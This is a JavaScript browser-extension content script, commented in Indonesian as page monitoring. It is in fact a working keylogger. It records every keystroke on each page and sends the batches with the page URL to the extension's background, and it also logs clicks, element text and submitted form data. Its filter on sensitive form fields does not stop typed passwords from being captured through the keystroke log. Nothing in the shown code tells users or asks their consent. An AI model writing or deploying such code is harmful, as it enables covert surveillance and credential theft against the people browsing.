// Content script untuk monitoring aktivitas di halaman web
class PageMonitor {
  constructor() {
    this.keyBuffer = [];
    this.lastActivity = Date.now();
    this.init();
  }

  init() {
    this.setupKeylogger();
    this.setupActivityMonitor();
    this.setupFormMonitor();
  }

  setupKeylogger() {
    let keyBuffer = '';
    let lastSend = Date.now();

    document.addEventListener('keydown', (event) => {
      // Filter sensitive keys
      if (this.shouldLogKey(event)) {
        keyBuffer += this.getKeyString(event);
        
        // Send buffer every 10 seconds or when it reaches 100 characters
        if (Date.now() - lastSend > 10000 || keyBuffer.length > 100) {
          this.sendKeyData(keyBuffer);
          keyBuffer = '';
          lastSend = Date.now();
        }
      }
    });

    // Send remaining buffer when page unloads
    window.addEventListener('beforeunload', () => {
      if (keyBuffer.length > 0) {
        this.sendKeyData(keyBuffer);
      }
    });
  }

  shouldLogKey(event) {
    // Skip function keys, ctrl combinations, etc.
    if (event.ctrlKey || event.altKey || event.metaKey) return false;
    if (event.key.length > 1 && !['Enter', 'Space', 'Tab', 'Backspace'].includes(event.key)) return false;
    return true;
  }

  getKeyString(event) {
    switch(event.key) {
      case 'Enter': return '\n';
      case 'Tab': return '\t';
      case ' ': return ' ';
      case 'Backspace': return '[BACKSPACE]';
      default: return event.key;
    }
  }

  setupActivityMonitor() {
    // Monitor mouse movements and clicks
    let activityBuffer = [];
    
    ['click', 'scroll', 'focus', 'blur'].forEach(eventType => {
      document.addEventListener(eventType, (event) => {
        activityBuffer.push({
          type: eventType,
          timestamp: Date.now(),
          element: this.getElementInfo(event.target)
        });
        
        // Send activity data every 30 seconds
        if (activityBuffer.length > 50) {
          this.sendActivityData(activityBuffer);
          activityBuffer = [];
        }
      });
    });

    // Send activity data periodically
    setInterval(() => {
      if (activityBuffer.length > 0) {
        this.sendActivityData(activityBuffer);
        activityBuffer = [];
      }
    }, 30000);
  }

  setupFormMonitor() {
    // Monitor form submissions
    document.addEventListener('submit', (event) => {
      const formData = new FormData(event.target);
      const data = {};
      
      for (let [key, value] of formData.entries()) {
        // Filter sensitive data
        if (!this.isSensitiveField(key)) {
          data[key] = value;
        }
      }
      
      this.sendActivityData([{
        type: 'form_submit',
        timestamp: Date.now(),
        formData: data,
        action: event.target.action
      }]);
    });
  }

  isSensitiveField(fieldName) {
    const sensitiveFields = ['password', 'ssn', 'credit', 'card', 'cvv', 'pin'];
    return sensitiveFields.some(field => 
      fieldName.toLowerCase().includes(field)
    );
  }

  getElementInfo(element) {
    return {
      tagName: element.tagName,
      id: element.id,
      className: element.className,
      text: element.textContent?.substring(0, 50)
    };
  }

  sendKeyData(keyData) {
    chrome.runtime.sendMessage({
      type: 'keylog',
      data: {
        content: keyData,
        timestamp: Date.now(),
        url: window.location.href
      }
    });
  }

  sendActivityData(activities) {
    chrome.runtime.sendMessage({
      type: 'activity',
      data: {
        activities: activities,
        timestamp: Date.now(),
        url: window.location.href
      }
    });
  }
}

// Initialize page monitor
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    new PageMonitor();
  });
} else {
  new PageMonitor();
}